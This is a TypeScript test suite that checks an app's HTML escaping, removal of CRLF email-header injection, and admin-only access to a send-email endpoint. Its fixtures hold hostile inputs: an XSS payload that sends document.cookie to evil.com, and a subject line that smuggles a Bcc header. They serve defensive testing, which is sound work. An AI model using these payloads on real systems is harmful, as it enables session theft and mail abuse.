/* eslint-disable @typescript-eslint/no-explicit-any */
import test from 'node:test';
import assert from 'node:assert/strict';
import { escapeHtml } from '../api/_utils.js';

test('--- Test Suite: Seguridad de Correos y Sanitización HTML (Fase 3.3) ---', async (t) => {

  await t.test('escapeHtml: neutraliza etiquetas <script> y tags HTML', () => {
    const maliciousInput = '<script>alert("XSS")</script>';
    const sanitized = escapeHtml(maliciousInput);
    assert.equal(sanitized, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    assert.equal(sanitized.includes('<script>'), false);
    assert.equal(sanitized.includes('</script>'), false);
  });

  await t.test('escapeHtml: escapa comillas dobles, comillas simples y ampersands', () => {
    const input = `User "Name" & 'Test' <tag>`;
    const sanitized = escapeHtml(input);
    assert.equal(sanitized, 'User &quot;Name&quot; &amp; &#039;Test&#039; &lt;tag&gt;');
  });

  await t.test('escapeHtml: neutraliza inyección de atributos de eventos onerror / onload', () => {
    const payload = `<img src="x" onerror="fetch('https://evil.com/steal?c=' + document.cookie)">`;
    const sanitized = escapeHtml(payload);
    assert.equal(sanitized.includes('<img'), false);
    assert.equal(sanitized.includes('>'), false);
    assert.equal(sanitized.startsWith('&lt;img'), true);
  });

  await t.test('escapeHtml: maneja valores no-string de forma resiliente', () => {
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
    assert.equal(escapeHtml(12345), '');
    assert.equal(escapeHtml({}), '');
    assert.equal(escapeHtml([]), '');
  });

  await t.test('Prevención de CRLF Header Injection en subject de correos', () => {
    const evilSubject = "Solicitud\r\nBcc: hacker@malicious.com\r\nSubject: Fake";
    const cleaned = evilSubject.replace(/[\r\n]/g, '').trim();
    assert.equal(cleaned.includes('\r'), false);
    assert.equal(cleaned.includes('\n'), false);
    assert.equal(cleaned, "SolicitudBcc: hacker@malicious.comSubject: Fake");
  });

  await t.test('Plantilla de correo de bienvenida neutraliza customMessage con HTML inyectado', () => {
    const dirtyMessage = `<b onclick="alert(1)">Bienvenido</b><script src="bad.js"></script>\nLínea 2`;
    // Sanitización exigida en Fase 3.3
    const safeCustomMessage = escapeHtml(dirtyMessage).replace(/\n/g, '<br/>');
    assert.equal(safeCustomMessage.includes('<b onclick'), false);
    assert.equal(safeCustomMessage.includes('<script'), false);
    assert.equal(safeCustomMessage.includes('&lt;b onclick=&quot;alert(1)&quot;&gt;Bienvenido&lt;/b&gt;'), true);
    assert.equal(safeCustomMessage.includes('<br/>Línea 2'), true);
  });

  await t.test('Validación de control de acceso: envío de correo send-email requiere autenticación admin', async () => {
    // Importar handler de users para probar directamente
    const usersHandlerModule = await import('../api/users.js');
    const handler = usersHandlerModule.default;

    let statusCode = 0;
    let jsonResponse: any = null;

    const mockReq: any = {
      method: 'POST',
      query: { action: 'send-email' },
      body: {
        to: 'target@example.com',
        nombre: 'Docente Prueba'
      },
      headers: {
        origin: 'https://sysget-saber.vercel.app'
      }
    };

    const mockRes: any = {
      setHeader: () => mockRes,
      status: (code: number) => {
        statusCode = code;
        return {
          json: (data: any) => { jsonResponse = data; return mockRes; },
          end: () => mockRes
        };
      }
    };

    await handler(mockReq, mockRes);

    // Debe ser rechazado con 403 Forbidden porque no hay token ni rol admin
    assert.equal(statusCode, 403, 'send-email sin token debe retornar 403 Forbidden');
    assert.ok(jsonResponse?.error, 'Debe devolver mensaje de error de autorización');
  });

});
